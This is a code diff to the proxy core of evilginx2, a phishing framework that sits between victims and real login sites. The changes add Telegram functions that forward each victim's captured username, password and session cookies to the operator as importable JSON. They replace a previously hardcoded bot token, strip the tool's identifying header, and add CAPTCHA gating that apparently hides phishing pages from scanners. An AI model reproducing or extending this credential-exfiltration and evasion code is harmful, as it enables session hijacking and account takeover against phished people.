@@ -34,13 +34,12 @@ import (
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
-
-	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
 const (
@@ -75,6 +74,8 @@ type HttpProxy struct {
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
+	telegram_bot      *tgbotapi.BotAPI
+	telegram_chat_id  int64
 }
 
 type ProxySession struct {
@@ -84,7 +85,28 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func (p *HttpProxy) NotifyWebhook(msg string) {
+	if p.telegram_bot != nil {
+		creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
+		if _, err := p.telegram_bot.Send(creds); err != nil {
+			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
+		}
+	}
+}
+
+func (p *HttpProxy) SendCookies(msg string) {
+	if p.telegram_bot != nil {
+		cookies := tgbotapi.NewDocumentUpload(p.telegram_chat_id, tgbotapi.FileBytes{
+			Name:  "tg_cookies.json",
+			Bytes: []byte(msg),
+		})
+		if _, err := p.telegram_bot.Send(cookies); err != nil {
+			log.Error("failed to send telegram cookie webhook with length %v: %s", len(msg), err)
+		}
+	}
+}
+
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, proxies []string, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -98,6 +120,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		telegram_bot:      nil,
 	}
 
 	p.Server = &http.Server{
@@ -115,6 +138,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		} else {
 			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
 		}
+	}
+
+	if len(cfg.webhook_telegram) > 0 {
+		confSlice := strings.Split(cfg.webhook_telegram, "/")
+		if len(confSlice) != 2 {
+			log.Fatal("telegram config not in correct format: <bot_token>/<chat_id>")
+		}
+		bot, err := tgbotapi.NewBotAPI(confSlice[0])
+		if err != nil {
+			log.Fatal("telegram NewBotAPI: %v", err)
+		}
+		p.telegram_bot = bot
+		p.telegram_chat_id, _ = strconv.ParseInt(confSlice[1], 10, 64)
 	}
 
 	p.cookieName = GenRandomString(4)
@@ -174,8 +210,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
-
+			
 			phishDomain, phished := p.getPhishDomain(req.Host)
+			if req.Method == "POST" {
+				ip := GetUserIP(nil, req)
+				if req.URL.Path == "/ImplementOutOfTheBoxContent" {
+					phished = p.ValidateTurnstileCaptcha(ip, req.PostForm["cf-turnstile-response"][0])
+				}
+				if req.URL.Path == "/VisualizeAutomatedMetrics" {
+					phished = p.ValidateRecaptcha(ip, req.PostForm["g-recaptcha-response"][0])
+				}
+			}
+			
+
+			
 			if phished {
 				pl := p.getPhishletByPhishHost(req.Host)
 				pl_name := ""
@@ -183,13 +231,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
-				egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					if err != nil && !p.isWhitelistedIP(remote_addr) {
+					if err != nil {// && !p.isWhitelistedIP(remote_addr)} {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							var vv string
 							var uv url.Values
@@ -226,18 +273,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								bot, err := tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
-								if err != nil {
-									log.Fatal("Failed to initialize Telegram bot:", err)
-								}
-
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-									msg := tgbotapi.NewMessage(5822512651, "New visitor has arrived: "+req.Header.Get("User-Agent")+" (IP: "+remote_addr+")")
-    								bot.Send(msg)
+									p.NotifyWebhook(fmt.Sprintf("[%d] new visitor has arrived: %s (%s)", sid, req.Header.Get("User-Agent"), remote_addr))
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
@@ -268,7 +309,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									ps.SessionId = session.Id
 									ps.Created = true
 									ps.Index = sid
-									p.whitelistIP(remote_addr, ps.SessionId)
+									//p.whitelistIP(remote_addr, ps.SessionId)
 
 									req_ok = true
 								}
@@ -294,7 +335,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							ps.Index, ok = p.sids[sc.Value]
 							if ok {
 								ps.SessionId = sc.Value
-								p.whitelistIP(remote_addr, ps.SessionId)
+								//p.whitelistIP(remote_addr, ps.SessionId)
 							}
 						} else {
 							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
@@ -357,7 +398,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
+				
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -384,9 +425,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
-				for n, b := range hg {
-					hg[n] = b ^ 0xCC
-				}
+				
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -414,7 +453,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -447,30 +485,37 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
-								if um != nil && len(um) > 1 {
+								if len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
+									}
+									if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
+										p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
 									}
 								}
 							}
 
 							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
-								if pm != nil && len(pm) > 1 {
+								if len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
+									if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
+										p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
+									}
+
 								}
 							}
 
 							for _, cp := range pl.custom {
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
-									if cm != nil && len(cm) > 1 {
+									if len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -481,11 +526,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						} else {
-
-							bot, err := tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
-								if err != nil {
-									log.Fatal("Failed to initialize Telegram bot:", err)
-								}
 
 							if req.ParseForm() == nil {
 								log.Debug("POST: %s", req.URL.Path)
@@ -500,34 +540,34 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("POST %s = %s", k, v[0])
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
-										if um != nil && len(um) > 1 {
+										if len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Username: %s ", um[1]))
-											bot.Send(msg)
+											if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
+												p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
+											}
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
-										if pm != nil && len(pm) > 1 {
+										if len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Password: %s ", pm[1]))
-											bot.Send(msg)
+											if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
+												p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
+											}
 										}
 									}
 									for _, cp := range pl.custom {
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
-											if cm != nil && len(cm) > 1 {
+											if len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
@@ -598,21 +638,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				p.cantFindMe(req, e_host)
+
 			}
 
 			return req, nil
 		})
-		
+
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			if resp == nil {
 				return nil
-			}
-
-			bot, err := tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
-			if err != nil {
-				log.Fatal("Failed to initialize Telegram bot:", err)
 			}
 
 			// handle session
@@ -690,6 +725,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
 						if err != nil {
 							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
+							if err != nil {
+								log.Error("time.Parse: %v", err)
+							}
 						}
 					}
 					ck.Expires = exptime
@@ -710,13 +748,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						s, ok := p.sessions[ps.SessionId]
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
-								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
+								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.SameSite, auth_tokens)
 								if len(pl.authUrls) > 0 {
 									is_auth = false
 								}
 								if is_auth {
 									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
 										log.Error("database: %v", err)
+									}
+									shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
+									if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
+										str := `[%d] Username: %v | Password: %v`
+										victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password)
+										p.NotifyWebhook(victimInfo)
+										p.SendCookies(TokensToJSON(pl, s.Tokens))
+										s.WebhookSent = true
 									}
 									s.IsDone = true
 								}
@@ -731,34 +777,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ck.String() != "" {
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
-			
-
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-
-				// Access session from map and handle potential errors
-				s, ok := p.sessions[ps.SessionId]
-				if ok {
-					tokensBytes, err := json.Marshal(s.Tokens)
-					if err != nil {
-						log.Error("Error marshaling tokens to JSON:", err)
-					} else {
-						fileData := tgbotapi.FileBytes{
-							Name:   "tokens.json",
-							Bytes:  tokensBytes,
-						}
-						msg := tgbotapi.NewDocument(5822512651, fileData)
-						_, err = bot.Send(msg) // Use the bot instance initialized outside this function
-						if err != nil {
-							log.Error("Error sending tokens to Telegram:", err)
-						} else {
-							log.Success("Tokens sent to Telegram")
-						}
-					}
-				} else {
-					log.Error("Session not found in session map")
-				}
 			}
 
 			// modify received body
@@ -870,34 +891,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
-			bot, err = tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
-			if err != nil {
-				log.Fatal("Failed to initialize Telegram bot:", err)
-			}
-
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
 							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
-							tokensBytes, err := json.Marshal(s.Tokens)
 							if err != nil {
 								log.Error("database: %v", err)
-								log.Error("Error marshaling tokens to JSON:", err)
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-								fileData := tgbotapi.FileBytes{
-									Name:   "tokens.json",
-									Bytes:  tokensBytes,
-								}
-								msg := tgbotapi.NewDocument(5822512651, fileData)
-								_, err = bot.Send(msg) // Use the bot instance initialized outside this function
-								if err != nil {
-									log.Error("Error sending tokens to Telegram:", err)
-								} else {
-									log.Success("Tokens sent to Telegram")
+
+								shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
+								if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
+									str := `[%d] Username: %v | Password: %v`
+									victimInfo := fmt.Sprintf(str, ps.Index, s.Username, s.Password)
+									p.NotifyWebhook(victimInfo)
+									p.SendCookies(TokensToJSON(pl, s.Tokens))
 								}
 							}
 							break
@@ -905,8 +916,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
-
-			
 
 			if pl != nil && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
@@ -977,6 +986,62 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 		}
 	}
 	return false
+}
+
+func TokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		SameSite       string `json:"sameSite"`
+	}
+
+	var cookies []*Cookie
+	for domain, tmap := range tokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+				Secure:         v.Secure,
+			}
+			// Convert int representation of SameSite to string representation
+			c.SameSite = "unspecified"
+			switch v.SameSite {
+			case 2:
+				c.SameSite = "lax"
+			case 3:
+				c.SameSite = "strict"
+			case 4:
+				c.SameSite = "no_restriction"
+			}
+
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	results, err := json.Marshal(cookies)
+	if err != nil {
+		log.Error("%v", err)
+	}
+	return string(results)
 }
 
 func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
@@ -1093,8 +1158,12 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 		n += rn
 	}
 
-	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
-	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
+	body = strings.ReplaceAll(body, "{lure_url_html}", lure_url)
+	body = strings.ReplaceAll(body, "{lure_url_js}", js_url)
+	body = strings.ReplaceAll(body, "{ lure_url_html }", lure_url)
+	body = strings.ReplaceAll(body, "{ lure_url_js }", js_url)
+	body = strings.ReplaceAll(body, "{ turnstile_sitekey }", p.cfg.turnstile_sitekey)
+	body = strings.ReplaceAll(body, "{ recaptcha_sitekey }", p.cfg.recaptcha_sitekey)
 
 	return body
 }
@@ -1614,8 +1683,93 @@ func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
 }
 
-func orPanic(err error) {
-	if err != nil {
-		panic(err)
+type CaptchaValidatedResp struct {
+	Success     bool          `json:"success"`
+	ChallengeTs string        `json:"challenge_ts"`
+	Hostname    string        `json:"hostname"`
+	ErrorCodes  []interface{} `json:"error-codes"`
+	Action      string        `json:"action"`
+	Cdata       string        `json:"cdata"`
+}
+
+func (p *HttpProxy) ValidateTurnstileCaptcha(ip, response string) bool {
+	dataToValidate := url.Values{
+		"secret":   []string{p.cfg.turnstile_privkey},
+		"response": []string{response},
+		"remoteip": []string{ip},
 	}
+
+	validation_resp, err := http.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", dataToValidate)
+	if err != nil {
+		log.Error("turnstile validation request: %v", err)
+		return false
+	}
+
+	res := &CaptchaValidatedResp{}
+	json.NewDecoder(validation_resp.Body).Decode(&res) // trunk-ignore(golangci-lint/errcheck)
+	defer validation_resp.Body.Close()
+	fmt.Printf("%#v\n", res)
+
+	if !res.Success {
+		log.Error("validation response unsuccessful: %v", res.ErrorCodes...)
+		return false
+	}
+
+	if !strings.Contains(p.cfg.baseDomain, res.Hostname) {
+		log.Error("captcha validation provided unsupported hostname: %v, expecting it to be a substring of %v. err: %v", res.Hostname, p.cfg.baseDomain, fmt.Sprintf("%v", res.ErrorCodes...))
+		return false
+	}
+	return true
+}
+
+func (p *HttpProxy) ValidateRecaptcha(ip, response string) bool {
+	dataToValidate := url.Values{
+		"secret":   []string{p.cfg.recaptcha_sitekey},
+		"response": []string{response},
+		"remoteip": []string{ip},
+	}
+
+	validation_resp, err := http.PostForm("https://www.google.com/recaptcha/api/siteverify", dataToValidate)
+	if err != nil {
+		log.Error("turnstile validation request: %v", err)
+		return false
+	}
+
+	res := &CaptchaValidatedResp{}
+	json.NewDecoder(validation_resp.Body).Decode(&res) // trunk-ignore(golangci-lint/errcheck)
+	defer validation_resp.Body.Close()
+	fmt.Printf("%#v\n", res)
+
+	if !res.Success {
+		log.Error("validation response unsuccessful: %v", res.ErrorCodes...)
+		return false
+	}
+
+	if !strings.Contains(p.cfg.baseDomain, res.Hostname) {
+		log.Error("captcha validation provided unsupported hostname: %v, expecting it to be a substring of %v. err: %v", res.Hostname, p.cfg.baseDomain, fmt.Sprintf("%v", res.ErrorCodes...))
+		return false
+	}
+	return true
+}
+
+// Get the IP address of the server's connected user.
+func GetUserIP(_ http.ResponseWriter, httpServer *http.Request) (userIP string) {
+	if len(httpServer.Header.Get("CF-Connecting-IP")) > 1 {
+		userIP = httpServer.Header.Get("CF-Connecting-IP")
+		userIP = net.ParseIP(userIP).String()
+	} else if len(httpServer.Header.Get("X-Forwarded-For")) > 1 {
+		userIP = httpServer.Header.Get("X-Forwarded-For")
+		userIP = net.ParseIP(userIP).String()
+	} else if len(httpServer.Header.Get("X-Real-IP")) > 1 {
+		userIP = httpServer.Header.Get("X-Real-IP")
+		userIP = net.ParseIP(userIP).String()
+	} else {
+		userIP = httpServer.RemoteAddr
+		if strings.Contains(userIP, ":") {
+			userIP = net.ParseIP(strings.Split(userIP, ":")[0]).String()
+		} else {
+			userIP = net.ParseIP(userIP).String()
+		}
+	}
+	return userIP
 }
